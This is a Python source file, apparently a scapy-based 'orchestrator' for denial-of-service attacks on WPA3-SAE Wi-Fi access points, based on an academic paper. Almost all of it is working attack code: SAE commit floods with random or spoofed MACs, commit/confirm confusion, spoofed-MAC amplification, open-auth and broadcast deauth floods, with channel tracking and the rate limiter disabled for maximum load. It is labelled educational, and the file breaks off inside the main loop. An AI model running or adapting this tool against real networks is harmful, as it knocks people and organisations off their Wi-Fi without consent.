#!/usr/bin/env python3
"""
================================================================================
WPA3-SAE DoS Orchestrator (Scientific Research Edition) - GROUP-AWARE VERSION
================================================================================
Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
Journal of Information Security and Applications 64 (2022) 103058
FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
================================================================================
FEATURES:
- Dynamic group rotation (19-24) with automatic filtering of empty groups
- Pair-wise scalar/finite validation using zip() (no cross-join)
- Enhanced logging: [PAIRS] with hex preview + [BURST] with active group info
================================================================================
ATTACKS IMPLEMENTED:
1. cookie_guzzler   : §VI-B (Memory Exhaustion / Anti-Clogging Bypass)
2. omnivore         : Random-MAC flood (universal DoS)
3. muted            : Static-MAC flood (bypasses MAC-based defenses)
4. hasty            : Commit+Confirm confusion attack
5. double_decker    : Combined random+static MAC flood
6. amplification    : Spoofed-MAC channel saturation
7. open_auth        : Legacy Open Auth flood (universal DoS)
8. back_to_the_future: WPA3-packets against WPA2 APs
================================================================================
"""
import os
import sys
import time
import glob
import random
import signal
import subprocess
import logging
import argparse
import json
from datetime import datetime
from multiprocessing import Process, Value, Manager, Lock

SHUTDOWN_FLAG = Value('b', False)

from scapy.all import (
    RadioTap, Dot11, Dot11Auth, Dot11Deauth, RandMAC, sniff, sendp
)

# ==============================================================================
# LOGGING & CONFIGURATION
# ==============================================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%dT%H:%M:%S'
)
logger = logging.getLogger("WPA3-SAE-Orchestrator")

# Scientific Constants (Paper §12.4.6, §12.4.8)
# IEEE 802.11 standard anti-clogging threshold. The AP activates defense after 
# this many new/failed authentication attempts. Keep at 5 for standard-compliant 
# DoS testing. Lowering it triggers AP protection earlier; raising it delays it.
ANTI_CLOGGING_THRESHOLD = 5

# Number of SAE-Commit frames sent per single burst. Larger values increase AP 
# RAM/CPU load but may cause driver buffer overflows or TX drops. Reduce to 64 
# for unstable/cheap Wi-Fi adapters, or increase to 256 for high-end hardware.
BURST_SIZE = 128

# Minimum time gap (seconds) between individual packets within a burst. Controls 
# raw transmission speed. Too low (<0.00005) causes hardware/driver drops; too 
# high reduces attack efficiency. Adjust based on your adapter's TX capabilities.
INTER_PACKET_GAP = 0.0001

# Global rate limiter: maximum packets per second across all bursts. Prevents 
# adapter overheating, driver crashes, or immediate AP firmware resets. Increase 
# for stronger load, decrease if you see "No such device" or TX drop errors.
PACKETS_PER_SECOND_LIMIT = 1000000 # Effectively disabled for maximum throughput #1000

# Delay (seconds) between consecutive bursts. Lower values (e.g., 0.3) increase 
# DoS intensity and stress the AP state machine faster, but may flood console logs. 
# Higher values (1.0+) allow partial AP state recovery and keep output readable.
LOG_DELAY_BETWEEN_BURSTS = 1.0

# Delay (seconds) between starting different attack processes/adapters in the 
# orchestrator. Prevents simultaneous channel switches and scanner conflicts. 
# Increase if adapters fail to initialize; decrease for faster multi-IF startup.
LOG_DELAY_BETWEEN_ATTACKS = 2.0

# SAE Group IDs & Payload Lengths (Group 19-24)
SAE_GROUP_BYTES = {
    19: b'\x13\x00', 20: b'\x14\x00', 21: b'\x15\x00',
    22: b'\x16\x00', 23: b'\x17\x00', 24: b'\x18\x00'
}
SAE_GROUP_LENGTHS = {
    19: (32, 64), 20: (48, 96), 21: (66, 132),
    22: (32, 256), 23: (32, 384), 24: (32, 512)
}

# ==============================================================================
# TARGET & ENVIRONMENT CONFIG (FILL BEFORE USE)
# ==============================================================================
TARGET_BSSID_5GHZ = "AA:BB:CC:DD:EE:11"      # Replace with actual 5GHz BSSID
TARGET_BSSID_2_4GHZ = "AA:BB:CC:DD:EE:12"    # Replace with actual 2.4GHz BSSID

# ==============================================================================
# SAE PARAMETERS - GROUP-AWARE DICTIONARIES (Groups 19-24)
# Structure: {group_id: [list of hex strings]}
# Replace INSERT placeholders with actual values from sae_extractor_arxiv_all_groups.py
# ==============================================================================
# ------------------------- SAE PARAMETER (from sae_extractor_arxiv_all_groups.py) -------------------------
# --- 5 GHz Band ---
SAE_SCALARS_5GHZ = {
    19: [
'INSERT_GROUP_19_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    ],
    20: [
'INSERT_GROUP_20_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    21: [
'INSERT_GROUP_21_SCALAR_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    22: ['INSERT_GROUP_22_SCALAR_5GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_5GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_5GHZ'],
}
SAE_FINITES_5GHZ = {
    19: [
'INSERT_GROUP_19_FINITE_5GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    20: [
'INSERT_GROUP_20_FINITE_5GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    21: [
'INSERT_GROUP_21_FINITE_5GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
    ],
    22: ['INSERT_GROUP_22_FINITE_5GHZ'],
    23: ['INSERT_GROUP_23_FINITE_5GHZ'],
    24: ['INSERT_GROUP_24_FINITE_5GHZ'],
}

# --- 2.4 GHz Band ---
SAE_SCALARS_2_4GHZ = {
    19: [
'INSERT_GROUP_19_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    

    ],
    20: [

'INSERT_GROUP_20_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    
    ],
    21: [

'INSERT_GROUP_21_SCALAR_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    
    
    ],
    22: ['INSERT_GROUP_22_SCALAR_2_4GHZ'],
    23: ['INSERT_GROUP_23_SCALAR_2_4GHZ'],
    24: ['INSERT_GROUP_24_SCALAR_2_4GHZ'],
}
SAE_FINITES_2_4GHZ = {
    19: [
'INSERT_GROUP_19_FINITE_2_4GHZ'
#Enter 20 values from sae_extractor_arxiv_all_groups.py    

    ],
    20: [
'INSERT_GROUP_20_FINITE_2_4GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py            
   
    ],
    21: [
'INSERT_GROUP_21_FINITE_2_4GHZ'    
#Enter 20 values from sae_extractor_arxiv_all_groups.py        
        
    ],
    22: ['INSERT_GROUP_22_FINITE_2_4GHZ'],
    23: ['INSERT_GROUP_23_FINITE_2_4GHZ'],
    24: ['INSERT_GROUP_24_FINITE_2_4GHZ'],
}

# --- 5. TARGET CLIENTS ---
KNOWN_STA_MACS_5GHZ   = []
KNOWN_STA_MACS_2_4GHZ = [
#    "AA:BB:CC:DD:EE:33",
#    "AA:BB:CC:DD:EE:34"

]

# --- 6. AMPLIFICATION REFLECTORS ---
# Enter the BSSIDs of ALL APs here that should be used as "Reflectors" or "Amplifiers".
# The more APs listed here, the greater the channel saturation.
AMPLIFICATION_REFLECTOR_APS_5GHZ =[
#    "AA:BB:CC:DD:EE:31", 
#    "AA:BB:CC:DD:EE:41", 
#    "AA:BB:CC:DD:EE:51",
#    "AA:BB:CC:DD:EE:61", 
#    "AA:BB:CC:DD:EE:81"  
]
AMPLIFICATION_REFLECTOR_APS_2_4GHZ =[
#    "AA:BB:CC:DD:EE:32", 
#    "AA:BB:CC:DD:EE:42", 
#    "AA:BB:CC:DD:EE:52",
#    "AA:BB:CC:DD:EE:62", 
#    "AA:BB:CC:DD:EE:82"           
]

# Scanner & Channel Config
SCANNER_INTERFACE = "wlanXmon"              # Leave empty to disable scanner
SCANNER_INTERVAL = 2
SCANNER_DURATION = 30                #Duration of a single scan run – how long airodump-ng runs and collects CSV data.
MANUAL_CHANNEL_5GHZ = ""
MANUAL_CHANNEL_2_4GHZ = ""

# ====================== ENCYCLOPEDIA OF ATTACKS ======================
#
# Here you will find a detailed explanation for each available attack type.
# Based on the scientific paper: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
#
# --- Category: Client Direct Attacks ---
#
# "deauth_flood": Classic deauth attack for forcible disconnection.
#
# --- Category: WPA3-Specific Attacks (Modern) ---
#
# "omnivore": Strongest flooding attack with constantly changing MACs.
#     Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
#             This forces the router to reserve memory (RAM) for each attempt until it is full.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.
#
# "muted": Flooding attack with a single, static MAC.
#     Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
#             bypass specific defense mechanisms that only react to attacks from many sources.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "hasty": Confusion attack with Commit & Confirm packets.
#     Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
#             This aims to confuse the router\'s state machine and generate CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "double_decker": Combines "omnivore" & "muted" for maximum stress.
#     Effect: Described by the authors as "powerful". It attacks the router simultaneously
#             before and after its anti-DoS defense is activated. Maximum memory and CPU load.
#     Most effective band: Both bands (Universal).
#     Suitable for: WPA3.
#
# "cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
#     Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
#             send a disproportionately large number of response frames, thereby overloading itself.
#     Suitable for: WPA3.
#
# --- Category: Universal & Vendor-Specific Attacks ---
#
# "open_auth": Classic DoS attack with Open Authentication requests.
#     Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
#             According to studies, this is particularly effective at overloading the basic CPU queue.
#     Most effective band: 5 GHz (According to study, most effective here).
#     Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.
#
# "amplification": Spoofs sender MACs of legitimate devices.
#     Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
#             device in the network. The target AP responds to the innocent device, clogging the channel.
#     Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
#     Suitable for: WPA2 and WPA3 (Universally effective, as WPA2 devices also respond with error messages
#                   that clog the channel) 2.4 GHz Band.
#
# "back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
#     Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
#             the WPA2 AP with these packets to fill its memory and cause it to crash.
#     Most effective band: Both bands (Universal, targets WPA2 APs).
#     Suitable for: WPA2 (Specifically targets WPA2 APs).
#

# Adapter → Attack Mapping
ADAPTER_CONFIGURATION = {
    # --- 5 GHz Band ---
#    "wlanXmon": {"band": "5GHz", "attack": "double_decker"},    
    "wlanXmon": {"band": "5GHz", "attack": "double_decker"},       
    # --- 2.4 GHz Band ---
#    "wlanXmon": {"band": "2.4GHz", "attack": "double_decker"},    
    "wlanXmon": {"band": "2.4GHz", "attack": "double_decker"}    

}

# ==============================================================================
# VALIDATION & HELPER FUNCTIONS
# ==============================================================================
def validate_sae_data(band: str) -> bool:
    """Checks if at least one valid SAE pair exists for the target band."""
    sc = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    fi = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    valid = [g for g in sc if any("INSERT" not in v for v in sc[g]) and any("INSERT" not in v for v in fi.get(g, []))]
    if not valid:
        logger.warning(f"[VALIDATION] {band}: No valid SAE data found. Attack will use random bytes.")
        return False
    logger.info(f"[VALIDATION] {band}: Valid groups: {valid}")
    return True

def get_valid_groups(band: str) -> list:
    """Returns list of group IDs that contain valid scalar/finite pairs."""
    sc = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    fi = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    valid = []
    for gid in [19, 20, 21, 22, 23, 24]:
        s_list = sc.get(gid, [])
        f_list = fi.get(gid, [])
        has_valid = any("INSERT" not in s for s in s_list) and any("INSERT" not in f for f in f_list)
        if has_valid:
            valid.append(gid)
    return valid if valid else [19]

def build_valid_pairs(scalars_list, finites_list, group_id):
    """Builds list of valid (scalar, finite) pairs for a group using zip."""
    s_len, e_len = SAE_GROUP_LENGTHS[group_id]
    pairs = []
    for s, f in zip(scalars_list, finites_list):
        s_clean = s.strip()
        f_clean = f.strip()
        if ("INSERT" not in s_clean and len(s_clean) == s_len*2 and
            "INSERT" not in f_clean and len(f_clean) == e_len*2 and
            all(c in '0123456789abcdefABCDEF' for c in s_clean+f_clean)):
            try:
                pairs.append((bytes.fromhex(s_clean), bytes.fromhex(f_clean)))
            except ValueError:
                continue
    return pairs

def get_sae_pair_from_list(valid_pairs):
    """Safely returns a random valid pair, falls back to random bytes if empty."""
    if not valid_pairs:
        s_len, e_len = SAE_GROUP_LENGTHS[19]
        return os.urandom(s_len), os.urandom(e_len)
    return random.choice(valid_pairs)

def set_channel_scientific(interface: str, channel: str) -> bool:
    """Robust channel switching via phy interface."""
    subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
    time.sleep(0.1)
    try:
        info = subprocess.run(['iw', 'dev', interface, 'info'], capture_output=True, text=True, timeout=2)
        phy_num = next((line.strip().split()[1] for line in info.stdout.splitlines() if line.strip().startswith('wiphy')), None)
        if not phy_num:
            return False
        res = subprocess.run(['iw', 'phy', f'phy{phy_num}', 'set', 'channel', str(channel)], capture_output=True, timeout=2)
        if res.returncode == 0:
            time.sleep(0.3)
            return True
    except Exception as e:
        logger.warning(f"[CHANNEL] Setup failed: {e}")
    return False

def send_burst_scientific(packet_list: list, interface: str, counter: Value, dry_run: bool = False):
    """Paper-aligned burst sending with graceful shared memory error handling."""
    if not packet_list or dry_run:
        return
    start = time.time()
    batch = packet_list[:BURST_SIZE]
    try:
        sendp(batch, iface=interface, verbose=False, inter=INTER_PACKET_GAP, count=1)
        elapsed = time.time() - start
        target = len(batch) / PACKETS_PER_SECOND_LIMIT
        if elapsed < target:
            time.sleep(target - elapsed)
        try:
            with counter.get_lock():
                counter.value += len(batch)
        except (OSError, ValueError, RuntimeError):
            pass
    except Exception as e:
        if "No such device" in str(e):
            logger.error(f"[HW ERROR] {interface} disappeared")
            time.sleep(2)
        else:
            logger.warning(f"[SEND] {interface}: {e}")

def scanner_process(iface, interval, duration, shared, lock, b5, b2):
    """Continuous scanner loop that flushes memory regularly and breathes."""
    if not iface: return
    try:
        while True:
            if SHUTDOWN_FLAG.value:
                break
                
            prefix = f"/tmp/scan_cont_{int(time.time())}"
            
            proc = subprocess.Popen(
                ['airodump-ng', '--write', prefix, '--output-format', 'csv', '--band', 'abg', '--write-interval', '2', iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            scan_start = time.time()
            while time.time() - scan_start < duration:
                if SHUTDOWN_FLAG.value:
                    break
                time.sleep(3)
                csvs = glob.glob(f"{prefix}-*.csv")
                if csvs:
                    latest_csv = max(csvs, key=os.path.getctime)
                    found = parse_airodump_csv(latest_csv, b5, b2)
                    with lock:
                        for b, ch in found.items():
                            if shared.get(b) != str(ch):
                                shared[b] = str(ch)
                                logger.info(f"[SCANNER] {b} AP detected on channel {ch}")
                                
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    
            for f in glob.glob(f"{prefix}*"):
                try: os.remove(f)
                except Exception: pass
                
            if SHUTDOWN_FLAG.value:
                break
                
            time.sleep(interval)
            
    except KeyboardInterrupt:

        pass
    finally:

        for f in glob.glob("/tmp/scan_cont_*"):
            try: os.remove(f)
            except Exception: pass

def parse_airodump_csv(csv_file: str, b5: str, b2: str) -> dict:
    """Parses airodump-ng CSV output – separates header block from data."""
    results = {}
    try:
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        # Split on double-newline to separate header block from AP/client blocks
        blocks = content.split('\n\n')
        if not blocks:
            return results
        # First block contains AP list
        for line in blocks[0].strip().split('\n'):
            if 'BSSID' in line or line.startswith('#') or not line.strip():
                continue
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 14 and parts[3].isdigit():
                ch = int(parts[3])
                if parts[0].upper() == b5.upper() and 36 <= ch <= 165:
                    results['5GHz'] = parts[3]
                elif parts[0].upper() == b2.upper() and 1 <= ch <= 14:
                    results['2.4GHz'] = parts[3]
    except Exception:
        pass  # Silent fail – scanner is optional
    return results

# ==============================================================================
# ATTACK ENGINE (§VI-A, §VI-B, §VI-C)
# ==============================================================================
def run_attacker_process(interface, bssid, initial_channel, band, attack_type, counter, shared_channels, dry_run=False):
    """Main attacker loop inside its own process. Dynamically resolves valid groups and tracks channels."""
    from scapy.all import RadioTap, Dot11, Dot11Auth, RandMAC, sniff, sendp
    
    current_channel = str(initial_channel)
    if current_channel and not set_channel_scientific(interface, current_channel):
        logger.warning(f"[ATTACK] {interface}: Channel setup warning, continuing...")

    valid_groups = get_valid_groups(band)
    group_index = 0
    logger.info(f"[ATTACK] [{interface}] Valid Groups: {valid_groups} | Band: {band} | Initial Ch: {current_channel}")

    scalars = SAE_SCALARS_5GHZ if band == "5GHz" else SAE_SCALARS_2_4GHZ
    finites = SAE_FINITES_5GHZ if band == "5GHz" else SAE_FINITES_2_4GHZ
    known_macs = KNOWN_STA_MACS_5GHZ if band == "5GHz" else KNOWN_STA_MACS_2_4GHZ

    precomputed_pairs = {}
    for gid in valid_groups:
        valid_s = [s for s in scalars.get(gid, []) if "INSERT" not in s]
        valid_f = [f for f in finites.get(gid, []) if "INSERT" not in f]
        precomputed_pairs[gid] = build_valid_pairs(valid_s, valid_f, gid)
    # ===================================================================

    burst_count = 0
    own_commit_cache = {}

    try:
        while True:
            if SHUTDOWN_FLAG.value:
                logger.info(f"[STOP] {interface} received shutdown signal")
                break

            latest_channel = shared_channels.get(band)
            if latest_channel and latest_channel != current_channel:
                logger.info(f"[TRACKING] {interface}: AP changed channel from {current_channel} to {latest_channel}. Hopping...")
                current_channel = latest_channel
                set_channel_scientific(interface, current_channel)
            # ==================================

            sae_group = valid_groups[group_index % len(valid_groups)]
            group_index += 1

            valid_pairs = precomputed_pairs.get(sae_group, [])

            if valid_pairs:
                preview_s = valid_pairs[0][0][:4].hex()
                preview_f = valid_pairs[0][1][:4].hex()
                logger.info(f"[PAIRS] [{interface} | {band}] Group {sae_group}: {len(valid_pairs)} valid pairs loaded. Sample: S={preview_s}... F={preview_f}...")
            else:
                logger.warning(f"[PAIRS] [{interface} | {band}] Group {sae_group}: No valid pairs. Falling back to random bytes.")

            def get_sae_pair():
                if not valid_pairs:
                    s_len, e_len = SAE_GROUP_LENGTHS[sae_group]
                    return os.urandom(s_len), os.urandom(e_len)
                return random.choice(valid_pairs)

            def make_commit(mac, seq=1, gid=sae_group, s_bytes=None, f_bytes=None, pw_id=None):
                if s_bytes is None or f_bytes is None:
                    gen_s, gen_f = get_sae_pair()
                    if s_bytes is None: s_bytes = gen_s
                    if f_bytes is None: f_bytes = gen_f
                payload = SAE_GROUP_BYTES[gid] + s_bytes + f_bytes
                return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=seq, status=0)/payload

            def safe_send(pkt, iface, dry):
                if not dry:
                    try:
                        sock = conf.L2socket(iface=iface)
                        sock.send(pkt)
                        sock.close()
                    except Exception: pass

            packets = []
            t0 = time.time()

            if attack_type == "cookie_guzzler":
                mac = str(RandMAC())
                packets = [make_commit(mac) for _ in range(BURST_SIZE)]

            elif attack_type == "omnivore":
                macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                for m in macs:
                    packets.append(make_commit(m))
                packets *= 20

            elif attack_type == "muted":
                mac = known_macs[0] if known_macs else "00:11:22:33:44:55"
                packets = [make_commit(mac) for _ in range(BURST_SIZE)]

            elif attack_type == "hasty":
                for _ in range(BURST_SIZE // 2):
                    m = str(RandMAC())
                    packets.append(make_commit(m, seq=1))
                    confirm = RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=m, addr3=bssid)/\
                              Dot11Auth(algo=3, seqnum=2, status=0)/b'\x00\x00'/bytes([random.randint(0,255) for _ in range(32)])
                    packets.append(confirm)

            elif attack_type == "double_decker":
                for _ in range(BURST_SIZE // 2):
                    packets.append(make_commit(str(RandMAC())))
                if known_macs:
                    packets.extend([make_commit(known_macs[0]) for _ in range(BURST_SIZE // 2)])

            elif attack_type == "amplification":
                refl = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == "5GHz" else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
                if len(refl) >= 2:
                    src, dst = random.sample(refl, 2)
                    s, f = get_sae_pair()
                    p = RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/\
                          Dot11Auth(algo=3, seqnum=1, status=0)/SAE_GROUP_BYTES[sae_group]+s+f
                    packets = [p] * BURST_SIZE

            elif attack_type == "open_auth":
                for _ in range(BURST_SIZE):
                    packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/\
                                   Dot11Auth(algo=0, seqnum=1, status=0))

            elif attack_type == "back_to_the_future":
                for _ in range(BURST_SIZE):
                    packets.append(make_commit(str(RandMAC())))

            elif attack_type == "deauth_flood":
                targets = (known_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                for sta in targets:
                    p1 = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    p2 = RadioTap()/Dot11(addr1=bssid, addr2=sta, addr3=bssid)/Dot11Deauth(reason=7)
                    packets.extend([p1, p2])
                packets *= 5

            else:
                logger.warning(f"[ATTACK] Unknown type: {attack_type}. Falling back to cookie_guzzler.")
                mac = str(RandMAC())
                packets = [make_commit(mac) for _ in range(BURST_SIZE)]

            if packets:
                send_burst_scientific(packets, interface, counter, dry_run)
                burst_count += 1
                dt = time.time() - t0

                LOG_EVERY_N_BURSTS = 5  
                if burst_count % LOG_EVERY_N_BURSTS == 0:
                    logger.info(f"[BURST] Interface: {interface} | Band: {band} | Channel: {current_channel} | Attack: {attack_type.upper()} | Active Group: {sae_group} | Pairs: {len(valid_pairs)} | Burst: #{burst_count} | Duration: {dt:.3f}s")

            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))

    except KeyboardInterrupt:
        logger.info(f"[STOP] Interface: {interface} interrupted")
    except Exception as e:
        logger.error(f"[CRASH] Interface: {interface} | Error: {e}")

# ==============================================================================
# ERRATA COVERAGE & LOGGING
# ==============================================================================
ERRATA_MAP = {
    "cookie_guzzler": ["#5 Anti-clogging >= threshold"],
    "omnivore": ["#5 Anti-clogging >= threshold"],
    "amplification": ["#5 Anti-clogging >= threshold"],
}

def log_attack_meta(attack: str, band: str, ch: str, iface: str, dry: bool):
    """Writes attack metadata to a JSON-lines log file for research documentation."""
    meta = {
        "timestamp": datetime.now().isoformat(),
        "attack": attack,
        "band": band,
        "channel": ch,
        "interface": iface,
        "dry_run": dry,
        "errata_mitigations": ERRATA_MAP.get(attack, ["N/A"])
    }
    with open("/tmp/sae_attack_log.jsonl", "a") as f:
        f.write(json.dumps(meta) + "\n")

# ==============================================================================
# GRACEFUL SHUTDOWN HANDLER
# ==============================================================================
def graceful_shutdown(sig, frame):
    logger.info("[SIGNAL] Shutdown requested. Stopping all processes...")
    SHUTDOWN_FLAG.value = True

def cleanup(procs, scanner):
    for iface, p in procs.items():
        try:
            if p is not None and hasattr(p, 'is_alive') and p.is_alive():
                p.terminate()
                p.join(timeout=2)
                if p.is_alive():
                    p.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping {iface}: {e}")
    if scanner is not None:
        try:
            if hasattr(scanner, 'is_alive') and scanner.is_alive():
                scanner.terminate()
                scanner.join(timeout=2)
                if scanner.is_alive():
                    scanner.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping scanner: {e}")

# ==============================================================================
# ENCYCLOPEDIA TEXT (Printed in Help Menu)
# ==============================================================================
ENCYCLOPEDIA_TEXT = """
====================== ENCYCLOPEDIA OF ATTACKS ======================

--- Category: Client Direct Attacks ---

"deauth_flood": Classic deauth attack for forcible disconnection.

--- Category: WPA3-Specific Attacks (Modern) ---

"omnivore": Strongest flooding attack with constantly changing MACs.
    Effect: Floods the router with WPA3 connection attempts from ever-changing, random MAC addresses.
            This forces the router to reserve memory (RAM) for each attempt until it is full.
    Most effective band: Both bands (Universal).
    Suitable for: WPA3 (Very effective). WPA2 APs usually discard the packets without much load.

"muted": Flooding attack with a single, static MAC.
    Effect: Similar to "omnivore", but all attacks come from the same MAC address. This aims to
            bypass specific defense mechanisms that only react to attacks from many sources.
    Most effective band: Both bands (Universal).
    Suitable for: WPA3.

"hasty": Confusion attack with Commit & Confirm packets.
    Effect: Sends not only the first step of the WPA3 handshake (Commit) but also immediately the second (Confirm).
            This aims to confuse the router's state machine and generate CPU load.
    Most effective band: Both bands (Universal).
    Suitable for: WPA3.

"double_decker": Combines "omnivore" & "muted" for maximum stress.
    Effect: Described by the authors as "powerful". It attacks the router simultaneously
            before and after its anti-DoS defense is activated. Maximum memory and CPU load.
    Most effective band: Both bands (Universal).
    Suitable for: WPA3.

"cookie_guzzler": Exploits the faulty re-transmission behavior of APs.
    Effect: Sends SAE Commit frames in "bursts" from random MAC addresses to force the AP to
            send a disproportionately large number of response frames, thereby overloading itself.
    Suitable for: WPA3.

--- Category: Universal & Vendor-Specific Attacks ---

"open_auth": Classic DoS attack with Open Authentication requests.
    Effect: A "Legacy" attack that floods the router with simple, old authentication requests.
            According to studies, this is particularly effective at overloading the basic CPU queue.
    Most effective band: 5 GHz (According to study, most effective here).
    Suitable for: WPA2 and WPA3 (Universally effective). 5 GHz.

"amplification": Spoofs sender MACs of legitimate devices.
    Effect: The attacker sends packets to the target AP but spoofs the sender MAC address of another
            device in the network. The target AP responds to the innocent device, clogging the channel.
    Most effective band: 2.4 GHz (According to study, most effective here as this band is often more crowded).
    Suitable for: WPA2 and WPA3 (Universally effective). 2.4 GHz Band.

"back_to_the_future": Overloads the memory of a WPA2 AP with WPA3 packets.
    Effect: Exploits a bug in some WPA2 APs that react incorrectly to WPA3 packets. The attack floods
            the WPA2 AP with these packets to fill its memory and cause it to crash.
    Most effective band: Both bands (Universal, targets WPA2 APs).
    Suitable for: WPA2 (Specifically targets WPA2 APs).
"""

# ==============================================================================
# MAIN ORCHESTRATOR
# ==============================================================================
def main():
    valid_attacks = ["cookie_guzzler", "omnivore", "muted", "hasty", "double_decker", "amplification", "open_auth", "back_to_the_future", "deauth_flood"]
    
    parser = argparse.ArgumentParser(
        description="WPA3-SAE DoS Orchestrator (Group-Aware Research Edition)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=ENCYCLOPEDIA_TEXT
    )
    parser.add_argument("--dry-run", action="store_true", help="Construct packets but DO NOT send (for safe testing)")
    parser.add_argument("--attack", type=str, choices=valid_attacks, help="Override attack type for all given interfaces")
    parser.add_argument("--interfaces", type=str, help="Comma-separated list of interfaces (e.g. wlan10mon,wlan1mon)")
    parser.add_argument("--band", type=str, help="Comma-separated list of bands mapping to interfaces (e.g. 5GHz,2.4GHz)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("Root required (sudo).")

    logger.info("[MODE] DRY-RUN: Packets constructed but NOT transmitted." if args.dry_run else "[MODE] EXECUTE: Packets WILL be transmitted!")

    global ADAPTER_CONFIGURATION
    # Override Logic
    if args.interfaces or args.band:
        if not (args.interfaces and args.band):
            sys.exit("Error: To override adapters, BOTH --interfaces and --band must be provided.")
        ifaces = [i.strip() for i in args.interfaces.split(',')]
        bands = [b.strip() for b in args.band.split(',')]
        if len(ifaces) != len(bands):
            sys.exit("Error: The number of --interfaces must exactly match the number of --band arguments.")
        if not args.attack:
            sys.exit("Error: Please specify an --attack when overriding interfaces.")
        
        # Build new configuration to replace defaults
        ADAPTER_CONFIGURATION = {}
        for i in range(len(ifaces)):
            ADAPTER_CONFIGURATION[ifaces[i]] = {"band": bands[i], "attack": args.attack}
    elif args.attack:
        # User only specified an attack, override the default attack for all pre-configured interfaces
        for iface in ADAPTER_CONFIGURATION:
            ADAPTER_CONFIGURATION[iface]['attack'] = args.attack

    # Shared channel dictionary for scanner
    shared_channels = Manager().dict({'2.4GHz': MANUAL_CHANNEL_2_4GHZ, '5GHz': MANUAL_CHANNEL_5GHZ})
    channel_lock = Lock()

    # Start scanner if configured
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(
            target=scanner_process,
            args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION, shared_channels, channel_lock, TARGET_BSSID_5GHZ, TARGET_BSSID_2_4GHZ),
            daemon=True
        )
        scanner_proc.start()
        time.sleep(2)

    procs = {}
    counters = {i: Value('L', 0) for i in ADAPTER_CONFIGURATION}

    try:
        while True:
            for iface, cfg in ADAPTER_CONFIGURATION.items():
                band, attack = cfg['band'], cfg['attack']
                
                with channel_lock:
                    ch = shared_channels.get(band)
                    if not ch:
                        ch = MANUAL_CHANNEL_5GHZ if band == '5GHz' else MANUAL_CHANNEL_2_4GHZ

                if not ch:
                    logger.info(f"[WAIT] {iface}: Waiting for scanner to find {band} AP channel...")
                    time.sleep(3)
                    continue
                # ===================================

                try:
                    proc_alive = procs.get(iface) is not None and procs[iface].is_alive()
                except (AttributeError, ValueError):
                    proc_alive = False

                if not proc_alive:
                    validate_sae_data(band)
                    log_attack_meta(attack, band, ch, iface, args.dry_run)
                    target_b = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
